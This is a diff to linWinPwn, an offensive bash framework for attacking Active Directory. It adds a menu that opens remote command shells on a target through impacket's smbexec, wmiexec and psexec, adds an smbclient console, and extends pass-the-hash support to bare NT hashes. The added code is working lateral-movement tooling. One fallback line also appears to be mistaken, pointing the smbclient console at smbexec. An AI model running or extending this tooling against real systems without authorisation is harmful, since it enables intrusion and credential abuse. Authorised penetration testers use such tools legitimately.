@@ -55,7 +55,7 @@ if [ ! -f "${impacket_goldenPac}" ]; then impacket_goldenPac=$(which impacket-go
 impacket_rpcdump=$(which rpcdump.py)
 if [ ! -f "${impacket_rpcdump}" ]; then impacket_rpcdump=$(which impacket-rpcdump); fi
 impacket_reg=$(which reg.py)
-if [ ! -f "${impacket_reg}" ]; then impacket_reg=$(which impacket_reg); fi
+if [ ! -f "${impacket_reg}" ]; then impacket_reg=$(which impacket-reg); fi
 impacket_smbserver=$(which smbserver.py)
 if [ ! -f "${impacket_smbserver}" ]; then impacket_smbserver=$(which impacket-smbserver); fi
 impacket_ticketer=$(which ticketer.py)
@@ -64,6 +64,14 @@ impacket_ticketconverter=$(which ticketConverter.py)
 if [ ! -f "${impacket_ticketconverter}" ]; then impacket_ticketconverter=$(which impacket-ticketconverter); fi
 impacket_raiseChild=$(which raiseChild.py)
 if [ ! -f "${impacket_raiseChild}" ]; then impacket_raiseChild=$(which impacket-raiseChild); fi
+impacket_smbclient=$(which smbclient.py)
+if [ ! -f "${impacket_smbclient}" ]; then impacket_smbclient=$(which impacket-smbexec); fi
+impacket_smbexec=$(which smbexec.py)
+if [ ! -f "${impacket_smbexec}" ]; then impacket_smbexec=$(which impacket-smbexec); fi
+impacket_wmiexec=$(which wmiexec.py)
+if [ ! -f "${impacket_wmiexec}" ]; then impacket_wmiexec=$(which impacket-wmiexec); fi
+impacket_psexec=$(which psexec.py)
+if [ ! -f "${impacket_psexec}" ]; then impacket_psexec=$(which impacket-psexec); fi
 enum4linux_py=$(which enum4linux-ng)
 if [ ! -f "${enum4linux_py}" ]; then enum4linux_py="$scripts_dir/enum4linux-ng.py"; fi
 bloodhound=$(which bloodhound-python)
@@ -113,7 +121,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.3 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.4 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -253,6 +261,7 @@ prepare (){
     mkdir -p ${output_dir}/ADCS
     mkdir -p ${output_dir}/BruteForce
     mkdir -p ${output_dir}/Credentials
+    mkdir -p ${output_dir}/CommandExec
     mkdir -p ${output_dir}/DomainRecon/Servers
     mkdir -p ${output_dir}/DomainRecon/Users
     mkdir -p ${output_dir}/Kerberos
@@ -425,7 +434,10 @@ authenticate (){
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Certificate of $user located at $(realpath $pfxcert)${NC}"
             hash_bool=true
         else
-            if ([ "${#hash}" -eq 65 ] && [ "$(expr substr $hash 33 1)" == ":" ]) || ([ "${#hash}" -eq 33 ] && [ "$(expr substr $hash 1 1)" == ":" ]) ; then
+            if ([ "${#hash}" -eq 65 ] && [ "$(expr substr $hash 33 1)" == ":" ]) || ([ "${#hash}" -eq 33 ] && [ "$(expr substr $hash 1 1)" == ":" ]) || ([ "${#hash}" -eq 32 ] ); then
+                if [ "$(echo $hash | grep ':' )" == "" ] ; then
+                    hash=":"$hash
+                fi
                 if [ "$(echo $hash | cut -d ":" -f 1)" == "" ] ; then
                     hash="aad3b435b51404eeaad3b435b51404ee"$hash
                 fi
@@ -1961,6 +1973,24 @@ manspider_scan () {
     fi
 }
 
+smbclient_console () {
+    if [ ! -f "${impacket_smbclient}" ]; then
+        echo -e "${RED}[-] smbclient.py not found! Please verify the installation of impacket ${NC}"
+    elif [ "${nullsess_bool}" == true ]; then
+        echo -e "${PURPLE}[-] smbclient requires credentials${NC}"
+    else
+        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
+        read -p ">> " smbclient_target </dev/tty
+        while [ "${smbclient_target}" == "" ] ; do
+            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+            read -p ">> " smbclient_target </dev/tty
+        done
+        echo -e "${BLUE}[*] Opening smbclient.py console on target: $smbclient_target ${NC}"
+        run_command "${impacket_smbclient} ${argument_imp}"@${smbclient_target} 2>&1 | tee -a ${output_dir}/Shares/impacket_smbclient_output.txt
+    fi
+    echo -e ""
+}
+
 ###### vuln_checks: Vulnerability checks
 zerologon_check () {
     echo -e "${BLUE}[*] zerologon check. This may take a while... ${NC}"
@@ -2740,6 +2770,61 @@ get_hash (){
         fi
         gethash_nt=$(/bin/cat "${output_dir}/Credentials/hash_${gethash_user}_${dc_domain}.txt" | grep ${gethash_user} |grep -v "aes\|des" | cut -d ":" -f 4)
         gethash_aes=$(/bin/cat "${output_dir}/Credentials/hash_${gethash_user}_${dc_domain}.txt" | grep aes256 | cut -d ":" -f 3)
+    fi
+    echo -e ""
+}
+
+###### cmd_exec: Open CMD Console
+smbexec_console () {
+    if [ ! -f "${impacket_smbexec}" ]; then
+        echo -e "${RED}[-] smbexec.py not found! Please verify the installation of impacket ${NC}"
+    elif [ "${nullsess_bool}" == true ]; then
+        echo -e "${PURPLE}[-] smbexec requires credentials${NC}"
+    else
+        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
+        read -p ">> " smbexec_target </dev/tty
+        while [ "${smbexec_target}" == "" ] ; do
+            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+            read -p ">> " smbexec_target </dev/tty
+        done
+        echo -e "${BLUE}[*] Opening smbexec.py console on target: $smbexec_target ${NC}"
+        run_command "${impacket_smbexec} ${argument_imp}"@${smbexec_target} 2>&1 | tee -a ${output_dir}/CommandExec/impacket_smbexec_output.txt
+    fi
+    echo -e ""
+}
+
+wmiexec_console () {
+    if [ ! -f "${impacket_wmiexec}" ]; then
+        echo -e "${RED}[-] wmiexec.py not found! Please verify the installation of impacket ${NC}"
+    elif [ "${nullsess_bool}" == true ]; then
+        echo -e "${PURPLE}[-] wmiexec requires credentials${NC}"
+    else
+        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
+        read -p ">> " wmiexec_target </dev/tty
+        while [ "${wmiexec_target}" == "" ] ; do
+            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+            read -p ">> " wmiexec_target </dev/tty
+        done
+        echo -e "${BLUE}[*] Opening wmiexec.py console on target: $wmiexec_target ${NC}"
+        run_command "${impacket_wmiexec} ${argument_imp}"@${wmiexec_target} 2>&1 | tee -a ${output_dir}/CommandExec/impacket_wmiexec_output.txt
+    fi
+    echo -e ""
+}
+
+psexec_console () {
+    if [ ! -f "${impacket_psexec}" ]; then
+        echo -e "${RED}[-] psexec.py not found! Please verify the installation of impacket ${NC}"
+    elif [ "${nullsess_bool}" == true ]; then
+        echo -e "${PURPLE}[-] psexec requires credentials${NC}"
+    else
+        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
+        read -p ">> " psexec_target </dev/tty
+        while [ "${psexec_target}" == "" ] ; do
+            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+            read -p ">> " psexec_target </dev/tty
+        done
+        echo -e "${BLUE}[*] Opening psexec.py console on target: $psexec_target ${NC}"
+        run_command "${impacket_psexec} ${argument_imp}"@${psexec_target} 2>&1 | tee -a ${output_dir}/CommandExec/impacket_psexec_output.txt
     fi
     echo -e ""
 }
@@ -3552,6 +3637,7 @@ shares_menu () {
     echo -e "3) SMB shares Spidering using netexec "
     echo -e "4) SMB shares Scan using FindUncommonShares"
     echo -e "5) SMB shares Scan using manspider"
+    echo -e "6) Open smbclient.py console on target"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -3584,6 +3670,10 @@ shares_menu () {
 
         5)
         manspider_scan
+        shares_menu;;
+
+        6)
+        smbclient_console
         shares_menu;;
 
         back)
@@ -3934,6 +4024,44 @@ modif_menu () {
         echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
         echo -e ""
         modif_menu;;
+    esac
+}
+
+cmdexec_menu () {
+    echo -e ""
+    echo -e "${CYAN}[Command Execution menu]${NC} Please choose from the following options:"
+    echo -e "------------------------------------------------------------------"
+    echo -e "1) Open CMD console using smbexec on target"
+    echo -e "2) Open CMD console using wmiexec on target"
+    echo -e "3) Open CMD console using psexec on target"
+    echo -e "back) Go back"
+    echo -e "exit) Exit"
+
+    read -p "> " option_selected </dev/tty
+
+    case ${option_selected} in
+        1)
+        smbexec_console
+        cmdexec_menu;;
+
+        2)
+        wmiexec_console
+        cmdexec_menu;;
+
+        3)
+        psexec_console
+        cmdexec_menu;;
+
+        back)
+        main_menu;;
+
+        exit)
+        exit 1;;
+
+        *)
+        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
+        echo -e ""
+        cmdexec_menu;;
     esac
 }
 
@@ -4359,6 +4487,7 @@ main_menu () {
     echo -e "8) MSSQL Enumeration Menu"
     echo -e "9) Password Dump Menu"
     echo -e "10) AD Objects or Attributes Modification Menu"
+    echo -e "11) Command Execution Menu"
     echo -e "back) Go back to Init Menu"
     echo -e "exit) Exit"
 
@@ -4397,6 +4526,9 @@ main_menu () {
 
         10)
         modif_menu;;
+
+        11)
+        cmdexec_menu;;
 
         back)
         init_menu;; 
